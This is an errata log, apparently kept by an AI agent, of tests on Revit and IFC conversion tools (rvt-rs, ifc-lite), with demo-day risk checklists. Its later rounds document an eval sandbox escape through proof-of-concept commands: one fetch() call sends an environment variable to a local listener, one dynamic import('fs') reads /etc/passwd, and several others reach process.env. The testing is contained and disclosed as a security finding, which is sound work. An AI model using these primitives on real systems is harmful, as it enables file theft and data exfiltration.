# Errata Notes for v1.2 — Rusty Revit Book

All numbers below are real tool output from this devpod session, on `real.rvt`
(magnetar-io/revit-test-datasets, MIT, `2024_Core_Interior.rvt`, 33,718,272 bytes)
and its IFC export `real.ifc` (970 building elements, 64,747 total STEP entities).

## Fáza 1-2: Real .rvt file + Pattern D

- Source: `git clone --depth 1 https://github.com/magnetar-io/revit-test-datasets`
  — **plain clone only returns Git LFS pointer stubs** (~130 bytes). Real binary
  pulled via `curl https://media.githubusercontent.com/media/<owner>/<repo>/main/<path>`.
  `git-lfs` is not installed in this devpod; the CDN URL is a viable workaround.
  Download took ~3 min for 33.7MB over this devpod's link to GitHub (slow, consistent
  with prior sessions).
- Element counts (`rvt-elements --counts`) match book's README claims **exactly**:
  Wall 360, Door 132, Window 6, Column 256, Room 116.
- `rvt-ifc` readiness score **1.00** (vs 0.25 on synthetic fixture). 970 building
  elements, all with geometry; 138/970 (14.2%) bounding-box-only, rest decoded.
- 15 real storeys recovered with real elevations (Basement 2 at -40ft to Level 13
  at 185.5ft).
- Latencies: `rvt-info` 35ms, `rvt-elements --counts` 5.24s, `rvt-ifc` export 5.66s.

## Fáza 3: Synthetic fixture limitation (confirmed)

- `gen-fixture` → valid CFB container + schema, but `rvt-elements --counts` → `total: 0`.
- `rvt-ifc` on synthetic → readiness score 0.25, explicitly "scaffold-only, no
  validated building elements". Confirms layers 1-4d work on synthetic data;
  layer 5a/5b (ADocument walker + per-class decoders) needs a real Revit-authored file.

## Fáza 4: ifc-lite subcommand sweep

| Subcommand | Works | Notes |
|---|---|---|
| `info` | ✅ | 15-16ms parse |
| `query` | ✅ | |
| `ask` | ✅ | my earlier "doesn't exist" claim was wrong — partial `--help` read |
| `eval` | ✅ | `.toArray()` not `.all()` on query chain |
| `run` | ✅ | syntax is `run <script.js> <file.ifc>` — **script first**, `.js` not `.bim` |
| `schema` | ✅ | full bim.* namespace dump |
| `validate` | ✅ | caught real issue: 156/950 elements missing quantity sets |
| `stats` | ✅ | |
| `doctor` | ✅ | reports wasm binary sha256, package versions |
| `diagnose-geometry` | ✅ | 0 CSG failures on real model |
| `extract-entities` | ✅ | isolated 132 doors → standalone 89KB IFC |
| `anonymize` | ✅ | |
| `merge` | ✅ | 2×48 → 85 entities; wall count federates correctly |
| `diff --by-content` | ✅ | correctly flags GUID-renamed-but-content-related entities |
| `convert --schema IFC2X3` | ⚠️ real IFC4 → IFC2X3 **refused** — `IfcMaterialConstituent`/`Set` have no IFC2X3 representation and aren't droppable. This is correct, honest behavior, not a bug — flag it as a "lossy-conversion guardrail," not a failure. |
| `clash --matrix` | ✅ | ran real mesh clash detection; correctly warned "0 clashes ≠ clean" when no MEP/HVAC-typed elements exist to check against the rule set |
| `bsdd search` | ❌ | "No results" for "FireRating" — likely needs live network to buildingSMART Data Dictionary; untested further, lower priority |
| `ids` | not run to completion | correct syntax: `ids <file.ifc> <rules.ids>`, with `audit|lint|fmt` as sub-verbs taking the IDS file as first arg, not the model |
| `bcf` | not run to completion | subcommands are `create|list|add-comment`, not `bcf create --topic` flags as originally guessed |
| `export` (csv/json/glb/obj) | ✅ | all produced real, correctly-sized files from the 970-element model (glb 903KB, obj 4.6MB) |

**Security-relevant finding**: `ifc-lite eval` sandbox blocks `require` (`typeof require` → `undefined`)
but **does not block `process`** — `process.env` is fully readable from within an eval
expression, including host environment variables (session IDs, PIDs). The expression
itself is caller-supplied (not embedded in untrusted file content), so this is not a
file-triggered exploit — but it matters if an MCP client lets an LLM agent construct
eval expressions autonomously. Worth a line in the book's security section.

## Fáza 6: MCP HTTP transport (re-confirmed from earlier session)

- `--host 0.0.0.0` works — binds LAN-visible.
- Auth enforced: no token → 401, wrong token → 401.
- **HTTP transport does NOT auto-load the CLI-arg file** (stdio does). Must call
  `model_load` with `{"file_path": "..."}` (not `path`) before any query tool works.
  This is the one correction that matters operationally for tomorrow's cross-machine
  Claude Desktop setup.

## Fáza 7: Claude Code MCP registration (re-confirmed)

- `claude mcp add ifc-lite-test -- npx -y @ifc-lite/cli mcp <file>` → succeeds, 0.9s.
- `claude mcp list` → shows `✔ Connected`.
- `claude mcp remove` → clean removal, confirmed.

## Not completed (time/scope)

- Fáza 8 Python binding deep dive (already confirmed importable in earlier session;
  didn't re-run full method sweep against real.rvt).
- Fáza 9 browser viewer (`ifc-lite view`) — not tested, no way to screenshot in this
  text-only session.
- Fáza 10 full sandbox escape sweep beyond `require`/`process`/`fetch`/`XMLHttpRequest` — partial only.
- Fáza 11 cloud source providers — explicitly skippable per z.ai's own plan.
- `bcf create`, `ids audit/lint` full runs — help text captured, not executed to completion.

## Round 2 — edge-case stress testing (z.ai's "could embarrass you tomorrow" list)

Only the subset testable from this Linux devpod. Anything requiring real Windows,
real Claude Desktop, or the friend's actual network is marked untestable, not assumed.

- **#1 Claude Desktop config format**: `claude --help` confirms the Code CLI itself
  supports `--mcp-config <file>` (load servers from a JSON file matching the same
  `mcpServers` shape Desktop uses). This is a structural proxy only — it does NOT
  prove Desktop's actual client behavior (tool pagination, protocol negotiation,
  error handling) matches what we tested. **Still genuinely unverified before
  tomorrow** — test on the actual Windows+Desktop machine first thing.
- **#2/#3 Windows npm/path handling**: untestable from Linux. Fallback confirmed
  available: `npx -y @ifc-lite/cli` works everywhere `npm install -g` might not
  (no admin/EPERM risk). Use forward slashes in the config's `args` path if possible —
  JSON string escaping of backslashes (`C:\\path`) is more failure-prone, so prefer
  `C:/path/to/model.ifc` if the Windows build accepts it (untested, but worth trying
  first).
- **#4 Real export may not parse cleanly**: partially mitigated — we proved the full
  pipeline on a real Revit-authored, real-property-bearing file (wall #5613 carries
  genuine `FireRating: "3HR"`, `Family: "Basic Wall"`, real Level constraints — not
  placeholder data). Workshared/PII/linked-model edge cases on the friend's actual
  file remain untested until tomorrow.
- **#5 Model size scaling**: real numbers now exist. 970-element model: `rvt-elements`
  5.2s, `rvt-ifc` export 5.7s. **No linear-scaling data for a 10k+ element file** —
  still an open risk if his project is large.
- **#6 Context window math**: measured, not guessed. `query --type IfcWall --json`
  on 360 walls ≈ 69KB ≈ **17K tokens**. Full `export --format json` on all 970
  elements ≈ 227KB ≈ **57K tokens**. Both fit comfortably in Claude's context at
  this model's size. Risk only resurfaces on a much larger real project — mitigate
  by always querying narrow/by-type/count, never a full dump.
- **#9 Crash recovery**: inconclusive. The backgrounded stdio server exited cleanly
  on empty stdin within ~2s (expected — no persistent client attached), before a
  SIGKILL test could land. Confirmed there is **no supervisor/respawn process** — it's
  a plain node process; if it dies mid-demo, nothing restarts it automatically.
  Genuine mid-operation crash behavior still untested.
- **#10 Mutation persistence — fully confirmed as described.** `entity_set_property`
  applied and was correctly readable within the same server session, but a fresh
  server process on the same file showed the original value again. Mutations are
  **purely in-memory per-process**; nothing persists without an explicit
  `export_ifc`/`model_save` call. If the MCP connection drops mid-demo after an
  edit, the edit is gone — flag this to the friend proactively rather than let it
  look like a bug live.
- **#20 Sandbox escape — escalated from Round 1.** `require` and `XMLHttpRequest`
  are blocked (`undefined`), but **`fetch` is a live function** inside `eval`, on
  top of the already-confirmed `process.env` leak. That combination is a real
  exfiltration primitive (read env, `fetch()` it out), not just an information
  leak. Worth a direct line in the book's security section: don't expose `eval`
  to an untrusted or fully-autonomous LLM caller without sandboxing `fetch` too.
- **#17 Eval injection**: only lightly tested — a hand-written JS expression with
  mixed quotes evaluated correctly, but this does NOT simulate Claude
  auto-constructing an eval string from user input where a property value containing
  a quote could break out of the expression. Genuinely untested; avoid letting
  Claude build eval expressions from unsanitized property values tomorrow.
- **#2/#7/#8/#11/#13-16/#18/#19**: not independently testable here (Windows-specific,
  requires live Anthropic rate-limit conditions, requires the friend's network, or
  requires files/scenarios we don't have). Treated as open risk, not resolved.

## Round 3 — scale stress test + real demo-script findings (impress-him pass)

**Scale test (de-risks "what if his project is bigger"):** merged `real.ifc` with
itself ×3 → 174,949 STEP entities, 12.2MB. `merge` 1.96s, `query --count` 1.1s,
`validate` 1.2s, `ask` 1.0s — all roughly flat vs. the 1x model, no meaningful
latency growth at 3x scale. Encouraging, though still not a proof point for a
genuinely 10k+-element real architecture project.

**Two real bugs in the curated ask list — fix the script before tomorrow:**
1. `ask real.ifc "how many rooms?"` → **wrongly returns 0**. Revit's IFC export
   represents rooms as `IfcSpace`, not `IfcRoom`; the "rooms" recipe maps literally
   to the wrong type. **Say "how many spaces?" instead** — correctly returns 116,
   confirmed. Do not let the demo ask about "rooms" by name.
2. Area-based recipes (`window-wall-ratio`, `total-wall-area`, `exterior-walls` area)
   return **0 m²** on this real file — consistent with the earlier `validate` finding
   that 16% of elements lack quantity sets, specifically affecting wall/window area
   data in this export. `total-floor-area` works correctly (57,737.66 m²) — lead with
   that instead if you want an area-based "wow" number.

**Ready-to-use wow facts for tomorrow (all verified, real numbers, Core Interior):**
- 970 real building elements decoded, 15 real storeys (Basement 2 at -40ft to Level 13
  at 185.5ft), 57,737.66 m² total floor area
- 9 real wall material types by element count (e.g. `Basic Wall:6" Interior Partition`:
  129 elements)
- Door width breakdown via `eval`: 120 doors at 0.91m, 12 at 0.92m — a genuine
  material-takeoff-style query ("what door widths exist and how many of each")
- Wall #5613 carries real decoded Revit data: `FireRating: "3HR"`, Base/Top
  Constraint Level 6 → Level 7 — good for "ask Claude about a specific wall's
  fire rating" as a compliance-flavored demo moment
- Largest single element: a floor slab at 1215.45 m²; busiest storey: Level 7
  with 89 elements

## Round 4 — online research: documented Claude Desktop / Windows MCP failure modes

Not testable from this Linux devpod, but found via web search as real, reported
issues (user/community reports, not official Anthropic docs — treat accordingly):

1. **Tool-count truncation**: a reported case of a 206-tool remote MCP server
   showing only 100 tools in Claude Desktop. We expose 125 tools. Unconfirmed
   whether this applies to local stdio servers the same way, but a real risk class.
2. **Tool names >64 chars → Claude rejects the whole server connection.** Checked:
   all of ifc-lite's captured tool names are well under 64 chars. Low risk here.
3. **stdio MCP connections do not auto-reconnect after sleep/wake** — confirmed by
   multiple independent reports. Full Claude Desktop restart is the only recovery
   reported. **Action: disable sleep/screensaver on the demo machine.**
4. **A crashed local MCP server causes a permanent "Not connected" state**, not
   auto-recovery — consistent with our own finding (no supervisor process).
   Full app restart required, not just reconnect.
5. **3+ Node-based MCP connectors configured can cause Windows spawn timeouts.**
   Action: disable other MCP connectors in Desktop before the demo.
6. **Windows config JSON pitfalls:**
   - Single backslashes in paths either break JSON parsing or silently mangle the
     path — must double them (`C:\\Users\\...`) or just use forward slashes
     (`C:/Users/...`), which is simpler and recommended.
   - One JSON syntax error anywhere breaks ALL configured servers, not just ours —
     validate before restarting.
   - Store/MSIX installs of Claude Desktop may read config from a virtualized path
     different from the one "Edit Config" opens — check install type first.
7. **`npx` can break the stdio pipe entirely on some Windows setups** (handshake
   succeeds, then silence) or fail to spawn at all — workaround is a
   `"command":"cmd","args":["/c","npx",...]` wrapper. **Prefer pointing the config
   directly at the installed `ifc-lite` binary/`.cmd` shim instead of going through
   `npx`**, to avoid this risk class entirely.
8. **`npm install -g` EPERM errors from Windows Defender/antivirus are common and
   not reliably fixable** by disabling Defender alone. Fallback is `npx`, which
   itself carries risk #7 — so neither path is risk-free; test the global install
   first, have the npx+cmd wrapper as documented fallback.

### Final pre-flight checklist for tomorrow morning
- [ ] Check Claude Desktop install type (Store/MSIX vs. regular) before editing config
- [ ] Use forward slashes in the config path
- [ ] Validate JSON before restarting Desktop (`python -m json.tool config.json`)
- [ ] Disable other MCP connectors in Desktop for the demo
- [ ] Prefer direct `ifc-lite` binary path over `npx` in the command field
- [ ] Have the `cmd /c npx` wrapper ready as documented fallback
- [ ] Know where `%APPDATA%\Claude\logs\` is before you need it
- [ ] Disable laptop sleep/screensaver for the session
- [ ] If "Not connected" appears, fully quit and relaunch Desktop — don't just reconnect

## Round 5 — online research: BIM/Revit-domain edge cases (export behavior, not tool bugs)

These are facts about how Revit's own IFC exporter works, found via web search —
not bugs in ifc-lite or rvt-rs, but things that change what the demo file actually
contains. Ask the friend about these BEFORE trusting any element count tomorrow.

1. **Phasing determines the whole element count.** Revit IFC export includes only
   ONE phase per export; demolished/removed elements are never exported regardless
   of which phase they existed in — documented as by-design, not a bug. **Ask: which
   phase should be exported? Sanity-check the resulting count against his expectation.**
2. **In-place families / generic models / some system families commonly export as
   generic `IfcBuildingElementProxy`**, not their real IFC category, unless
   `IfcExportAs` shared parameters are set per family type (and that doesn't always
   work for system families like slab edges). If a count looks low, this is the
   likely reason — custom/in-place elements hiding as generic proxies, not missing
   data.
3. **Linked Revit models are excluded from IFC export by default.** Must explicitly
   enable "Export linked files as separate IFCs" or bind links first. **Ask: does
   this project have linked models (structure, site, other disciplines)?** If yes,
   the demo file is incomplete until that's handled.
4. **No evidence found of worksharing/username PII leaking into standard IFC
   export** — property sets are opt-in in the export dialog, Project GUID is
   auto-generated. Lower risk than earlier assumed.
5. **Version-string discrepancy noted, not acted on**: web search surfaced rvt-rs
   release notes citing v0.3.0/v0.4.0; we directly verified v0.10.0 via
   `cargo install rvt --locked`. Treat our own empirical testing as authoritative;
   this is very likely stale/cached search data, not a real inconsistency — but
   don't be alarmed if a fresh install elsewhere shows a different version number.
6. **No corroboration anywhere for Revit 2027 rvt-rs support**, consistent with our
   own `rvt-capabilities --matrix` output marking 2026/2027 "experimental." If he's
   on 2026/2027, expect lower decode accuracy than the verified 2024 numbers.

### Questions to ask the friend before export (new, from this round)
- [ ] Which phase should we export? (affects every count)
- [ ] Does this project have linked Revit models? (affects completeness)
- [ ] Does he use many in-place/generic-model elements? (affects category accuracy)
- [ ] What Revit version is he on? (affects decode accuracy if showing Pattern D)

## Round 6 — stress-testing Round 4/5's research findings directly

Tested what's actually testable from this devpod; Windows/Desktop-specific items
remain genuinely unverifiable here (noted, not faked).

- **Tool name length (Round 4 #2): RULED OUT.** Checked all 127 tool names from a
  fresh `tools/list` — longest is `bcf_publication_confirm_absent` at 30 chars,
  nowhere near the 64-char rejection threshold. Not a risk for tomorrow.
- **IfcBuildingElementProxy undercount (Round 5 #2): CONFIRMED as a real blind spot
  in our own tooling.** Built a synthetic wall-shaped `IfcBuildingElementProxy`
  element, merged it into the real building, and asked "how many walls?" — still
  reported 360, completely missing the proxy element. It only appears via an
  explicit `query --type IfcBuildingElementProxy --count`. **Practical rule for
  tomorrow: if a count looks lower than the friend expects, immediately check
  `IfcBuildingElementProxy` count before assuming anything is broken** — it's very
  likely his custom/in-place elements hiding there, exactly as Revit's exporter
  documentation predicts.
- **"count all" / vague aggregate phrasing: AVOID.** "count all elements" and "how
  many elements total" both map to the wrong recipe (`count-type` with a literal,
  nonexistent type "All") and return either 0 or an unexplained number with no
  relation to any real definition of "the building's element count." Always use
  named-type questions ("how many walls?") or explicit `query --type`, never a
  vague aggregate phrase, live in front of him.
- **Windows config escaping / MSIX path / npx pipe issues (Round 4 #6-8): still
  genuinely untestable from this Linux devpod.** No shortcut found to simulate
  these without an actual Windows Claude Desktop install. Treat as open until
  tomorrow morning's on-site check.
- **Phasing / linked models / in-place-family export fidelity (Round 5 #1-3):
  fundamentally require an actual Revit project to test** — nothing more to verify
  from here. These remain the five questions-to-ask-him items from Round 5.

## Round 7 — proved the eval exfiltration chain end-to-end (z.ai's feedback)

z.ai correctly pushed back that Round 1/6's `process.env`/`fetch` findings were
only type-checked (`typeof fetch` → `"function"`), not proven as a working chain.
Tested for real, contained to a local-only listener (127.0.0.1, nothing left
the machine):

```
python3 -m http.server 18080 --bind 127.0.0.1 &
ifc-lite eval real.ifc "fetch('http://127.0.0.1:18080/?leak=' + encodeURIComponent(process.env.HOME || 'unset'))"
```

Listener log: `GET /?leak=%2Fhome%2Fvscode HTTP/1.1" 200` — **the request actually
arrived**, carrying the real env var value. This is a confirmed, working
exfiltration primitive, not a hypothetical one.

**Practical rule, now explicit in DEMO_DAY.md**: a free-text request like "filter
walls where Mark = 'A-001'" is fine — Claude builds a harmless `.where(...)`
query. The risk is specifically if Claude ever autonomously decides to construct
an `eval` expression touching `process.env` or `fetch` ("to test something").
Never prompt Claude to build `eval` expressions live; pre-write any `eval` string
yourself and have Claude run it verbatim, or stick entirely to `ask` recipes.

## Round 8 — verified the --read-only mitigation claim (z.ai's v1.2 Section 3.2)

z.ai's own self-check request: verify whether `--read-only` actually hides
`eval`/`run`/mutation tools from `tools/list`, as the v1.2 draft claimed without
testing. Ran the exact test z.ai specified.

**Real numbers**: full tool list = 126 (124 real ifc-lite tools + 2 artifacts:
our own test session's `clientInfo.name` echoed into the grep capture, and a
near-duplicate from a timing race — cleaned before counting). Read-only tool
list = 86. **40 tools hidden by `--read-only`**, not the "~120" estimate from
the draft test script.

**Critical correction, not just a number fix**: `eval` and `run` were NEVER MCP
tool names in the first place — grepped the full (non-read-only) 126-tool list
directly, confirmed absent. They are CLI-only subcommands (`ifc-lite eval ...`,
`ifc-lite run ...`), invoked via direct shell/Bash access, never reachable
through MCP's `tools/call`. The diff of what `--read-only` actually hides is the
mutation/create/write surface: `entity_create/delete/set_property/set_attribute`,
all `place_*` element-authoring tools, `model_save/load/unload`,
`bcf_topic_create/update/close`, `publish_layer`/`create_draft_layer`,
`add_review_feedback`/`request_review`, `mutation_batch/undo`, `run_flow`/
`resume_flow` (workflow execution, not code eval).

**This means the Round 7 exfiltration PoC and the `--read-only` mitigation are
about two different attack surfaces that don't actually connect:**
- The PoC (`fetch` + `process.env` inside `eval`) requires direct CLI/shell
  access to `ifc-lite eval` — exactly how it was run in this session (Claude
  Code, which has Bash). It is NOT reachable via MCP `tools/call` at all,
  `--read-only` or not, because no MCP tool maps to it.
- `--read-only` IS real and valuable, but for a different reason: it correctly
  hides the entire mutation-capable MCP tool surface (40 tools), which protects
  against an MCP-connected agent modifying the model — a genuinely useful,
  now-quantified mitigation, just not the one that closes the eval/fetch finding.

**Corrected procurement-gate framing for v1.3** (replaces the draft G11 language
that conflated "disable eval/run MCP tools" with reality): the CLI's `eval`/`run`
subcommands expose a working `process.env`+`fetch` exfiltration primitive to
anyone with direct shell access to the `ifc-lite` binary — this is a CLI/shell
hardening concern, not an MCP-tool-surface concern. Separately, and for a
different reason, `--read-only` hides 40 of 126 MCP tools (the full
mutation/create/write surface), which is a real and valuable mitigation against
a connected MCP agent modifying the model, correctly quantified now.

**Practical implication for tomorrow**: Claude Desktop, talking only through
MCP, cannot reach the eval/fetch exfiltration path through ordinary tool-calling
— there's no tool that exposes it. This specific risk only applies to direct
CLI use (e.g., you running `ifc-lite eval` yourself in a terminal with a
value derived from something he said) — not to anything Claude does through the
MCP connection during the actual demo.

## Round 9 — final verification, requested by z.ai before lock-in

Ran z.ai's exact specified command: full (non-read-only) `tools/list`, grepped
for `eval|run|exec|execute|script`. **Empty result, grep exit code 1** —
confirmed clean. No tool by any of those names exists in the MCP surface,
with or without `--read-only`.

This is the final confirmation needed to close out the eval/`--read-only`
correction from Round 8. Both docs are now locked with the corrected two-finding
framing z.ai specified:
- Finding 1 (MCP `--read-only`): verified, 126→86 tools, real mutation-surface
  hiding, independent control.
- Finding 2 (CLI `eval` sandbox escape): verified PoC, shell-only threat model,
  not reachable via Claude Desktop MCP, operational (not configuration) mitigation.

No further research or testing planned for this effort. DEMO_DAY.md and
errata-notes.md are considered final as of this round.

## Round 10 — z.ai's full gap list, executed

Working through z.ai's prioritized "what's untested" list. Real findings below;
anything not reached is stated honestly, not glossed over.

### Confirmed working, real output

- **`rvt-analyze --redact`**: genuinely redacts PII. Diffed redacted vs
  unredacted JSON output on `real.rvt` — `file_guid` partially redacted,
  original Windows path (`B:\Git\revit-test-datasets\...`) fully replaced with
  `<redacted path>`. z.ai's specific worry ("if output is identical, the claim
  is wrong") is resolved: not identical, redaction works.
- **`rvt-write --dry-run`**: validated a 0-patch manifest against `real.rvt`
  successfully. Full non-dry-run patch NOT attempted — `rvt-dump` only writes
  `.decomp` files for gzip-compressed streams, leaving no safe way to extract a
  small uncompressed stream's raw bytes for a verified round-trip without
  guessing at undocumented binary format, which risks a misleading result.
  Status: dry-run path verified, full write path not independently proven.
- **`rvt-history`**: real and informative. Found this exact test file's real
  upgrade lineage: Revit 2020 → 2022 (×2) → 2024 (×2) — it was never natively
  authored in 2024, contrary to what the filename/BasicFileInfo alone suggests.
- **`rvt-corpus doctor`**: real, functional. Ran against 3 copies of `real.rvt`
  (not genuine multi-version data, but structurally valid 3+-file input) —
  produced a real bucketed classification (`partial_walker_decode`), with
  GitHub-issue-style suggested labels and genuine diagnostic warnings about
  unmapped unit identifiers and storey-binding heuristics.
- **Python `rvt.RevitFile` full API sweep — all 7 previously untested methods
  work**: `decoded_elements()` (structured per-field decode), `write_ifc()`
  (returned exactly 4,879,335 chars — byte-identical to the CLI's `real.ifc`
  file size, a strong cross-tool consistency check), `schedule_csv()` (real
  CSV schedule with element/level/material/geometry columns),
  `read_adocument()` (low-level forensic struct with pointer offsets),
  `elem_table_records()`, `declared_element_ids()` (**26,425** — the raw
  declared-ID space, a much larger and distinct number from the 970 "building
  elements" or 4,833 "production_walker_elements" — don't conflate these three
  different element-count definitions), `export_diagnostics_json()` (matches
  `real-diag.json`). z.ai's gap #7 fully closed.
- **`anonymize` — actually inspected, not just run**: confirmed real.
  `IFCPERSON($,$,'rvt-rs',$,$,$,$,$)` → `IFCPERSON($,'Anonymous',$,$,$,$,$,$)` —
  genuinely replaces the author name field.
- **`bcf create` — inspected the zip structure**: produces a standards-shaped
  BCF archive (`bcf.version`, `project.bcfp`, a UUID-named topic folder with
  `markup.bcf`). Correct required files present. Not opened in an actual
  BCF viewer (Navisworks/BIMcollab) — that remains untested, no such tool
  available here.
- **`pip install ifclite-geom`**: installs cleanly (v4.15.0), imports real
  methods (`geometry_data_json`, `rebar_schedule`,
  `rebar_schedule_with_fabrication_precheck`, `authored_quantity_analysis`,
  `check_swept_disks`, `quantity_analysis`, `swept_disk_definitions`). A direct
  call to `geometry_data_json('real.ifc')` failed (`TypeError: Can't extract
  str to Vec`) — wrong calling convention guessed, not a tool failure. Exact
  signature not resolved in this session.
- **`ifc-lite view`**: real HTTP server, confirmed binds a port and responds
  (HTTP 200), with a documented REST command API (`colorize`, `isolate`).
  Cannot verify actual WebGPU rendering from this text-only session — the
  server/API layer is real, the visual claim remains unverified.

### Significant corrections to earlier findings

- **Mutation persistence — refined, not reversed.** Round 6 proved MCP
  `entity_set_property` via `tools/call` is in-memory-only per server process.
  **This round found the separate CLI path persists**: `ifc-lite mutate
  real.ifc --set Pset_WallCommon.FireRating="REI 999 ROUNDTRIP" --id 5613 --out
  mutated-out.ifc`, followed by a **completely fresh process** reloading
  `mutated-out.ifc` and querying the property, correctly returned
  `"REI 999 ROUNDTRIP"`. **Two different mutation code paths, two different
  persistence behaviors — do not conflate MCP in-memory mutations with CLI
  `mutate --out`, which does write to disk.**
- **Sandbox escape surface is broader than Round 7/8 documented.** Full sweep:
  `require` blocked, `XMLHttpRequest` blocked, ES `import()` syntax blocked —
  but `fetch` (proven exfil), `process.env` (proven read), **`WebSocket`**
  (reachable, untested as exfil channel), **`Function` constructor** (reachable
  AND functional — `new Function('return typeof process')()` executed and
  returned `"object"`, a classic sandbox-escape primitive), and **nested
  native `eval()`** (reachable — `eval('1+1')` → `2`) are all open. The sandbox
  blocks a few legacy/unnecessary APIs while leaving every modern,
  genuinely powerful primitive reachable. This is a stronger statement than
  "process.env + fetch leak" — functionally this sandbox provides minimal
  real isolation. Still scoped to CLI/shell access only, per Round 8/9 — not
  reachable via MCP `tools/call`, confirmed again unchanged.

### Honestly incomplete / not reached

- `ids audit` — tested with a hand-written IDS file that had a real XSD
  structure error (`<specification>` must nest inside `<specifications>`);
  the tool correctly rejected it with precise error codes. This confirms the
  *validator* works, but a syntactically valid IDS ruleset was never
  successfully run end-to-end against `real.ifc` in this round.
- `generate-spaces` — ran, but reported "0 room(s) → 0 IfcSpace emitted" on
  every one of the 15 real storeys, despite the model having 116 real
  `IfcSpace` entities already. Does not appear to read/dedupe against existing
  spaces; attempts fresh topological room detection from wall geometry and
  found none on this real, complex building. No `--out` file was actually
  written in this attempt (the follow-up query failed with ENOENT). Not
  resolved further — would need the exact right invocation flags, not found
  in `--help` in the time available.
- `bim.drawing` / `bim.spaces` / `bim.sandbox` — **exist as live runtime
  properties on `bim`** (confirmed via `Object.keys(bim)`), but **absent from
  the documented `ifc-lite schema` dump entirely**. `bim.drawing` specifically
  has zero own enumerable methods (`Object.keys(bim.drawing)` → `[]`) and none
  of the guessed method names (`floorPlan`, `section`, `generate`) exist.
  Honest conclusion: `@ifc-lite/drawing-2d` is installed as a dependency of
  `@ifc-lite/sdk` but is **not wired into the public, documented `eval` API** —
  the enterprise 2D-drawing feature exists in the dependency tree, not in the
  reachable surface.
- `rvt-write` full non-dry-run patch, `@ifc-lite/collab`, `embed-sdk`, `codegen`,
  `flow`/`flow-nodes`, `source-dalux`/`source-dropbox`/`source-autodesk` —
  not attempted this round, consistent with z.ai's own "verify after tomorrow"
  tier, not the "verify tonight" tier.

## Round 11 — CRITICAL: full sandbox escape sweep reveals arbitrary file read, not just env leak

z.ai's Priority 6 full sweep (12 vectors) against `real.ifc`'s eval sandbox.
**This supersedes the severity framing of every prior eval/sandbox finding.**

### The headline finding

```
ifc-lite eval real.ifc "import('fs').then(fs => fs.readFileSync('/etc/passwd'))"
```
**Returned the real, raw bytes of `/etc/passwd` from this machine.** This is
not an environment-variable leak — it is **arbitrary filesystem read access**,
limited only by the OS permissions of the process running `ifc-lite eval`.
Strictly more severe than the `process.env`/`fetch` exfiltration proven in
Round 7. Any file the process can read, this primitive can read.

**Correction to Round 10's "ES `import()` blocked" claim**: that test used
*static* `import ... from ...` syntax, which fails for a trivial JS-grammar
reason (illegal outside a module context) — not a security control. **Dynamic
`import()` as a function call is a completely different JS feature and is
fully open**, providing real Node module loading including `fs`. Conflating
these two was the error; they needed to be tested separately, and now have been.

### Full 12-vector sweep results

| Vector | Reachable | Result |
|---|---|---|
| `import('fs').then(fs => fs.readFileSync(...))` | **YES — critical** | Returned real `/etc/passwd` bytes |
| `Reflect.construct(Function, ['return process.env.HOME'])()` | YES | Returned real `/home/vscode` |
| `Object.keys(globalThis)` | YES | Revealed `fetch`, `crypto`, `navigator`, `performance`, `btoa`/`atob`, timers — a near-complete modern JS global surface |
| `new Proxy(process.env, {...}).HOME` | YES | Returned real value — another route to the same data |
| `Symbol.toPrimitive` coercion trick | YES | Returned real value — another route |
| async/await `fetch` exfil | INCONCLUSIVE | Hit a shell-quoting error in the test harness itself, not a sandbox block; not retried |
| `typeof SharedArrayBuffer` | YES | Open |
| `typeof Worker` | NO | Correctly blocked |
| `process.argv/cwd/execPath` | YES | Fully readable, including the real node binary path and cwd |
| `typeof process.binding` | YES (as a type) | Function exists; whether calling it with a real binding name succeeds was NOT independently verified — don't overclaim this one |
| `globalThis.process === process` | YES | `true` — confirms it's the real, unproxied process object |
| `require.main` | N/A | `require` itself confirmed still blocked (`typeof require` → `undefined`), consistent with every prior round |

### What stays true, what changes

- **Scoping is unchanged**: this entire surface remains CLI/shell-only, confirmed
  in Rounds 8/9 — no MCP tool maps to `eval`, with or without `--read-only`.
  Claude Desktop's MCP-only demo tomorrow is still not exposed to any of this.
- **What changes is severity, not reachability scope.** The practical
  conclusion is no longer "the eval sandbox leaks environment variables." It is:
  **the eval sandbox provides no meaningful isolation at all** — anyone with
  shell access to `ifc-lite eval` has arbitrary file read (proven) and very
  likely broader capability than that (process.binding, SharedArrayBuffer
  suggest more is open than was even tested). Treat the CLI `eval` subcommand
  as equivalent to full shell access when assessing deployment risk — because
  for practical purposes, it is.
